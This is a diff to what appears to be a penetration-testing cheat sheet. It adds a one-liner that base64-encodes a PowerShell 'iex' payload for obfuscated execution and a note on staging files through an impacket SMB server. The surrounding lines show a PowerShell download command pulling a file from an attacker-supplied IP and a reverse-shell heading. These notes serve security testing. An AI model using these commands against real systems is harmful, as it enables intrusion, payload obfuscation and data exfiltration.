@@ -814,6 +814,11 @@ iwr -uri http://<IP>/<filename> -Outfile <filename>                             
 powershell -c "command"                                                                                 The -c option will execute the supplied command as if it were typed at the PowerShell prompt
 ```
 
+**Encode PowerShell from the command line**
+- ```PowerShell
+  echo "iex(cmd)" | iconv -t UTF-16LE | base64 -w 0 | xclip -sel clip
+  ```
+  - [[Reference](https://twitter.com/whitecyberduck/status/1660095924931010560?s=46)]
 
 **Send a reverse shell with PowerShell**
 - ```PowerShell
@@ -1335,7 +1340,7 @@ Note: the script parameter `unsafe=1`, the scripts that will run are almost guar
 
 **General notes**
 - Remember that you can transfer files to the share with `copy <file> \\<IP>\share`
-
+  - Also when using `sudo impacket-smbserver -smb2support share .`
 
 ### <ins>NFS Enumeration</ins>
 
